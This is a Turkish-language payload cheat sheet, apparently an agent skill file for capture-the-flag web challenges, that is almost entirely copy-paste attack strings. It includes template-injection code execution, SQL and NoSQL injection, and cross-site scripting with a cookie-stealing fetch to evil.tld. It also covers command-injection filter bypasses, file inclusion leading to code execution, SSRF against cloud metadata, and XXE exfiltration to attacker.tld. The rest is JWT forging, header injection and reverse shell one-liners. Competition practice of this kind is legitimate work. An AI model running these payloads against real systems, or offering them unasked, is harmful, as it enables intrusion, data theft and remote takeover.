# CTF Payload Kütüphanesi

Yarışmada anında kopyala-yapıştır edilebilecek payload koleksiyonu. Her saldırı vektörü için en çok kullanılanlar.

---

## Jinja2 RCE Payloadları

### Klasik subclasses → Popen
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
# 396 indeksi versiyon bağımlı, otomatik bulmak için:
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in cls.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```

### Direkt config leak
```python
{{ config }}
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Filter bypass (attr/getattr ile)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Çıkış olmadan blind RCE (sleep)
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5', shell=True) }}
```

### Encoded payload (WAF bypass)
```python
{{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']() }}
```

---

## SSTI Payload (Tüm Diller)

| Engine | Test | RCE |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Tornado | `{{7*7}}` → 49 | `{% import os %}{{os.popen('id').read()}}` |
| Mako | `${7*7}` → 49 | `<%import os%>${os.popen('id').read()}` |
| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= \`id\` %>` |
| Twig (PHP) | `{{7*7}}` → 49 | `{{['id']|filter('system')}}` |
| Smarty (PHP) | `{$smarty.version}` | `{php}system('id');{/php}` |
| Thymeleaf | `${7*7}` → 49 | `[(${T(java.lang.Runtime).getRuntime().exec('id')})]` |
| FreeMarker | `${7*7}` → 49 | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| Velocity | `#set($x=7*7)$x` → 49 | `#set($x="")#set($r=$x.class.forName("java.lang.Runtime").getRuntime())#set($p=$r.exec("id"))` |
| Handlebars (JS) | `{{7*7}}` → çalışmıyor (safe by default) | `{{#with "constructor"}}...{{/with}}` |

---

## SQLi Payloadları

### MySQL
```sql
-- Auth bypass
' OR '1'='1
' OR 1=1 -- 
admin' --
admin' #
" OR 1=1 #
') OR ('1'='1

-- UNION based
' UNION SELECT 1,2,3-- 
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- 
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- 

-- Error based
' AND extractvalue(1, concat(0x7e, (SELECT database())))-- 
' AND updatexml(1, concat(0x7e, (SELECT user())), 1)-- 

-- Time based
' AND SLEEP(5)-- 
' AND IF(ascii(substr(database(),1,1))=100, SLEEP(5), 0)-- 

-- Boolean blind
' AND SUBSTRING(database(),1,1)='a'-- 

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')-- 

-- WAF bypass
'/**/UNION/**/SELECT/**/
%27%20UNION%20SELECT%20
' UnIoN SeLeCt
'/*!UNION*/ /*!SELECT*/
```

### PostgreSQL
```sql
-- Time based
' AND pg_sleep(5)--

-- File read (superuser gerekir)
' UNION SELECT pg_read_file('/etc/passwd')--

-- RCE (CVE-2019-9193)
'; COPY (SELECT '') TO PROGRAM 'id';--

-- Out-of-band DNS
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.tld/$(id)';--
```

### MSSQL
```sql
-- xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--

-- Time based
'; WAITFOR DELAY '0:0:5'--

-- Stack queries
'; SELECT * FROM users--
```

### SQLite
```sql
-- Schema dump
' UNION SELECT name FROM sqlite_master--

-- Time based (yok, ama heavy query)
' AND randomblob(100000000)--
```

### NoSQL (MongoDB)
```javascript
// Auth bypass
{"username":{"$gt":""}, "password":{"$gt":""}}
{"username":"admin", "password":{"$ne":"x"}}
{"username":"admin", "password":{"$regex":"^a"}}

// JS injection
{"$where": "this.password.match(/.*/)"}
{"$where": "function(){return 1==1}"}
```

---

## XSS Payloadları

### Klasik
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### WAF Bypass
```html
<sCrIpT>alert(1)</sCrIpT>
<script>alert(1)</script>
<script src=data:,alert(1)>
<svg/onload=alert`1`>
<svg><script href=data:,alert(1)>
<script>alert(/xss/)</script>

# Karakter filtrelerinde
<svg/onload=alert&#40;1&#41;>          # entity encoding
<svg/onload=alert&#x28;1&#x29;>        # hex entity
"><img src=x onerror=&#x61;lert(1)>    # mixed

# Cookie steal
<script>fetch('//evil.tld/?'+document.cookie)</script>

# Polyglot (HTML/JS/CSS/SQL)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### DOM XSS Sinks
```javascript
document.write(USER)
eval(USER)
setTimeout(USER)
location = USER
innerHTML = USER
document.cookie = USER
```

---

## Command Injection Bypass

### Boşluk filtresi
```bash
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$1/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
echo$IFS$9hello
X=$'cat\x20/etc/passwd'&&$X
```

### Slash filtresi
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo -e '\x2fetc\x2fpasswd')
cat `pwd`/etc/passwd
```

### Karakter blacklist bypass
```bash
# 'l' yasak
cat /etc/passwd | base64    # önce encode et
cat $(echo bHM=|base64 -d)  # 'ls' decoded

# Komut yok, sadece koşul
${IFS}        # space
$@            # boş arg
${PATH:0:1}   # /
${HOME:0:1}   # /
${RANDOM}     # rastgele
$(())         # 0
${#}          # 0
```

### Pipe/redirect bypass
```bash
id||whoami
id&&whoami
id;whoami
id`whoami`
id$(whoami)
id\nwhoami    # newline
```

---

## LFI Payloadları

### Path traversal
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd      # double encoded
%2e%2e/%2e%2e/etc/passwd
..\/..\/..\/etc/passwd
```

### PHP Wrapper (LFI → RCE/source)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://input + POST: <?php system('id'); ?>
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id     # expect:// wrapper
zip://shell.zip#shell.php
phar://shell.phar/test.txt
```

### Null byte (eski PHP)
```
../../../etc/passwd%00
../../../etc/passwd%00.png
```

### Log poisoning
```
1. ?file=/var/log/apache2/access.log
2. UA: <?php system($_GET['c']); ?>
3. ?file=/var/log/apache2/access.log&c=id
```

### /proc/self gambits
```
/proc/self/environ      # env değişkenleri
/proc/self/cmdline      # komut satırı
/proc/self/fd/0,1,2     # stdin/stdout/stderr
/proc/self/maps         # memory map
/proc/self/status       # process info
```

---

## SSRF Payloadları

### Cloud metadata
```
http://169.254.169.254/latest/meta-data/         # AWS
http://169.254.169.254/computeMetadata/v1/       # GCP (Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance         # Azure
http://metadata.google.internal/                 # GCP alias
```

### Localhost varyantları
```
http://localhost/
http://127.0.0.1/
http://127.1/
http://0/
http://0.0.0.0/
http://[::]/
http://0177.0.0.1/                  # octal
http://2130706433/                  # decimal
http://0x7f000001/                  # hex
http://127.0.0.1.nip.io/            # nip.io trick
```

### Schema bypass
```
file:///etc/passwd
gopher://127.0.0.1:6379/_FLUSHALL
dict://127.0.0.1:6379/INFO
ftp://attacker.tld/
ldap://127.0.0.1/
```

---

## XXE Payloadları

### Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Out-of-band
```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.tld/?d=%file;'>">
  %wrapper;
]>
<root>&send;</root>
```

### PHP filter (base64 ile binary leak)
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

---

## JWT Payload Generation

```python
import jwt

# alg:none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
token = jwt.encode(payload, "", algorithm="none")

# HS256 forge (secret bilindi)
token = jwt.encode({"user": "admin"}, "secret", algorithm="HS256")

# Manuel craft
import base64, json
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
unsigned = f"{h.decode()}.{p.decode()}."
print(unsigned)
```

---

## Reverse Shell One-Liner'lar

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (mkfifo trick)
mkfifo /tmp/p; nc ATTACKER 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();..."
```

URL-encode for HTTP delivery:
```bash
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | base64
# Sonra: bash -c {echo,BASE64HERE}|{base64,-d}|{bash,-i}
```

---

## Header Injection

```http
# Host header injection
Host: evil.tld

# X-Forwarded-* (IP spoofing)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1

# Method override
X-HTTP-Method-Override: PUT
X-HTTP-Method: PUT
X-Method-Override: PUT

# Cache poisoning
X-Forwarded-Proto: http
X-Original-URL: /admin
X-Rewrite-URL: /admin

# CL.TE smuggling
Content-Length: 4
Transfer-Encoding: chunked

# WebSocket auth bypass
Origin: https://trusted.tld
```

---

## CRLF Injection

```
%0d%0aSet-Cookie: admin=true
%0aLocation: https://evil.tld
%0d%0a%0d%0a<script>alert(1)</script>
```

---

## İlgili Skill'ler

Tüm payload'lar ilgili skill dosyalarının "Saldırı Adımları" bölümlerinde detaylı işleniyor:
- `skills/ctf/web/*` — Web tabanlı saldırılar
- `skills/ctf/crypto/jwt-attacks/SKILL.md` — JWT forge detayları
- `skills/ctf/cheatsheets/web-attack-decision-tree.md` — Hangi payload ne zaman
